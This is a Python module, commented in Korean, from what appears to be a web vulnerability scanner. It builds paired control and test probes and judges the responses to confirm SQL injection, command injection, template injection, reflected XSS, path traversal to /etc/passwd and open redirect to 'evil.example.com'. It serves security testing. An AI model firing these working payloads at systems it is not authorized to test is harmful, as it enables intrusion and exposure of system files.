"""오라클 기반 확증 스캔 (differential probe-set confirmation).

단발 페이로드는 "터졌는지"를 우연과 구분하기 어렵다. 여기서는 파라미터 하나에
대해 '대조군 + 실험군'을 짝지어 소수의 프로브를 보내고, 응답 차이(시간/본문/반사)
로 취약 여부를 확증한다. sqlmap/Burp Intruder 가 하는 방식과 동일한 원리.

역할 분담:
  - 이 모듈 = 지식(프로브 목록 + 판정 오라클). HTTP 전송은 하지 않는다.
  - api.py = 전송 계층. probe_plan() 으로 보낼 값을 받아 대상 파라미터에 주입·전송
    하고, 각 응답을 dict 로 모아 decide() 에 넘긴다.

decide() 에 넘기는 results 항목 형식:
  {"role": str, "status": int, "time_ms": float, "body": str, "headers": dict, "value": str}
"""
from __future__ import annotations

import re
from typing import Optional

# ── 판정 임계값 ───────────────────────────────────────────────
_TIME_DELTA_MIN = 3500    # SLEEP(5) - SLEEP(0) 이 이 이상이면 시간 기반으로 인정(ms)
_TIME_CTRL_MAX  = 2500    # 단, 대조(SLEEP 0)가 이보다 느리면 회선 지연으로 보고 기각(ms)
_LEN_DELTA_MIN  = 40      # 본문 길이차가 이 이상이면 '유의미한 변화'(byte)

# XSS 반사 확인용 고유 마커(우연 반사와 구분)
_XSS_MARKER = "zqx7k"
_XSS_BREAK  = f'{_XSS_MARKER}"><svg onload=alert(1)>'

_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.I)
_UID_RE    = re.compile(r"uid=\d+\([^)]+\)")

# 확증 프로브를 지원하는 카테고리
SUPPORTED = {"sqli", "ssti", "xss", "lfi", "cmdi", "redirect"}


def is_supported(category: str) -> bool:
    return (category or "").lower() in SUPPORTED


# ── 프로브 목록 (순수 함수) ───────────────────────────────────
def probe_plan(category: str, base_value: str = "") -> list[dict]:
    """카테고리별로 대상 파라미터에 넣을 값 목록을 반환.

    role 이 'baseline' 인 항목이 대조군. 나머지는 오라클이 참조한다.
    'replace' 계열(lfi/xss 등)은 원래 값을 무시하고 페이로드로 통째 교체하고,
    'append' 계열(sqli/cmdi)은 유효한 기존 값 뒤에 브레이크 시퀀스를 붙인다.
    """
    b = base_value or ""
    cat = (category or "").lower()

    if cat == "sqli":
        return [
            {"role": "baseline",   "label": "원본",            "value": b},
            {"role": "time0",      "label": "SLEEP(0) 문자열",  "value": f"{b}' AND SLEEP(0)-- -"},
            {"role": "time5",      "label": "SLEEP(5) 문자열",  "value": f"{b}' AND SLEEP(5)-- -"},
            {"role": "time0n",     "label": "SLEEP(0) 숫자",    "value": f"{b} AND SLEEP(0)-- -"},
            {"role": "time5n",     "label": "SLEEP(5) 숫자",    "value": f"{b} AND SLEEP(5)-- -"},
            {"role": "bool_true",  "label": "참 조건",          "value": f"{b}' AND '1'='1"},
            {"role": "bool_false", "label": "거짓 조건",        "value": f"{b}' AND '1'='2"},
        ]

    if cat == "cmdi":
        return [
            {"role": "baseline", "label": "원본",         "value": b},
            {"role": "time0",    "label": "sleep 0",      "value": f"{b};sleep 0"},
            {"role": "time5",    "label": "sleep 5",      "value": f"{b};sleep 5"},
            {"role": "time5s",   "label": "$(sleep 5)",   "value": f"{b}$(sleep 5)"},
            {"role": "idcmd",    "label": "; id",         "value": f"{b};id"},
        ]

    if cat == "ssti":
        return [
            {"role": "baseline", "label": "원본",       "value": b},
            {"role": "e_curly",  "label": "{{7*7}}",    "value": f"{b}{{{{7*7}}}}"},
            {"role": "e_dollar", "label": "${7*7}",     "value": f"{b}${{7*7}}"},
        ]

    if cat == "xss":
        return [
            {"role": "baseline", "label": "원본",        "value": b},
            {"role": "probe",    "label": "반사 마커",   "value": _XSS_BREAK},
        ]

    if cat == "lfi":
        return [
            {"role": "baseline", "label": "원본",             "value": b},
            {"role": "trav1",    "label": "../../etc/passwd", "value": "../../../../../../etc/passwd"},
            {"role": "trav2",    "label": "인코딩 우회",      "value": "....//....//....//....//....//etc/passwd"},
        ]

    if cat == "redirect":
        return [
            {"role": "baseline", "label": "원본",       "value": b},
            {"role": "probe",    "label": "외부 도메인", "value": "//evil.example.com"},
        ]

    return []


# ── 오라클 (순수 함수) ────────────────────────────────────────
def _loc_header(headers: dict) -> str:
    for k, v in (headers or {}).items():
        if k.lower() == "location":
            return str(v)
    return ""


def decide(category: str, results: list[dict]) -> dict:
    """프로브 응답들을 비교해 확증 여부를 판정.

    반환: {"confirmed": bool, "techniques": [{"name","evidence"}], "category": str}
    techniques 가 비어 있으면 '깨끗'(확증 실패).
    """
    cat = (category or "").lower()
    by = {r["role"]: r for r in results}
    techniques: list[dict] = []

    def ok(role: str) -> bool:
        r = by.get(role)
        return bool(r) and int(r.get("status") or 0) > 0

    if cat == "sqli":
        # 시간 기반 — 문자열/숫자 컨텍스트 각각
        for c0, c5, ctx in (("time0", "time5", "문자열"), ("time0n", "time5n", "숫자")):
            if ok(c0) and ok(c5):
                t0, t5 = by[c0]["time_ms"], by[c5]["time_ms"]
                if t0 < _TIME_CTRL_MAX and (t5 - t0) >= _TIME_DELTA_MIN:
                    techniques.append({
                        "name": f"시간 기반 SQLi ({ctx} 컨텍스트)",
                        "evidence": f"SLEEP(5)={t5:.0f}ms vs SLEEP(0)={t0:.0f}ms (Δ{t5 - t0:.0f}ms)",
                    })
        # 불린 기반 — 참/거짓 응답이 갈리는가
        if ok("baseline") and ok("bool_true") and ok("bool_false"):
            bt, bf = by["bool_true"], by["bool_false"]
            status_diff = bt["status"] != bf["status"]
            len_diff = abs(len(bt.get("body") or "") - len(bf.get("body") or ""))
            if status_diff or len_diff >= _LEN_DELTA_MIN:
                ev = []
                if status_diff:
                    ev.append(f"상태 참={bt['status']}/거짓={bf['status']}")
                if len_diff >= _LEN_DELTA_MIN:
                    ev.append(f"본문 길이차 {len_diff}B")
                techniques.append({"name": "불린 기반 SQLi", "evidence": "; ".join(ev)})

    elif cat == "cmdi":
        for c0, c5, ctx in (("time0", "time5", "; sleep"), ("time0", "time5s", "$(sleep)")):
            if ok(c0) and ok(c5):
                t0, t5 = by[c0]["time_ms"], by[c5]["time_ms"]
                if t0 < _TIME_CTRL_MAX and (t5 - t0) >= _TIME_DELTA_MIN:
                    techniques.append({
                        "name": f"명령 주입 (시간 기반, {ctx})",
                        "evidence": f"sleep5={t5:.0f}ms vs sleep0={t0:.0f}ms (Δ{t5 - t0:.0f}ms)",
                    })
        r = by.get("idcmd")
        if r and _UID_RE.search(r.get("body") or ""):
            m = _UID_RE.search(r["body"])
            techniques.append({"name": "명령 주입 (id 실행)", "evidence": f"응답에 '{m.group(0)}' 등장"})

    elif cat == "ssti":
        for role in ("e_curly", "e_dollar"):
            r = by.get(role)
            body = (r or {}).get("body") or ""
            # 49 가 '7*7' 원문이 아니라 계산 결과로 등장해야 함
            if r and "49" in body and "7*7" not in body:
                techniques.append({
                    "name": "SSTI (서버 템플릿 평가)",
                    "evidence": "표현식이 서버에서 계산됨 — 응답에 '49' 등장",
                })
                break

    elif cat == "xss":
        r = by.get("probe")
        body = (r or {}).get("body") or ""
        # 마커 브레이크가 '인코딩 없이' 그대로 반사되면 실행 가능
        if r and _XSS_BREAK in body:
            techniques.append({
                "name": "반사형 XSS (미인코딩 반사)",
                "evidence": f"주입한 '{_XSS_MARKER}\"><svg …>' 가 원문 그대로 반사됨",
            })

    elif cat == "lfi":
        for role in ("trav1", "trav2"):
            r = by.get(role)
            m = _PASSWD_RE.search((r or {}).get("body") or "")
            if r and m:
                techniques.append({
                    "name": "로컬 파일 읽기 (LFI)",
                    "evidence": f"응답에 /etc/passwd 내용 '{m.group(0)}' 노출",
                })
                break

    elif cat == "redirect":
        r = by.get("probe")
        loc = _loc_header((r or {}).get("headers") or {})
        if r and ("evil.example.com" in loc):
            techniques.append({
                "name": "오픈 리다이렉트",
                "evidence": f"Location 헤더가 외부로 이동: {loc[:100]}",
            })

    return {"confirmed": bool(techniques), "techniques": techniques, "category": cat}
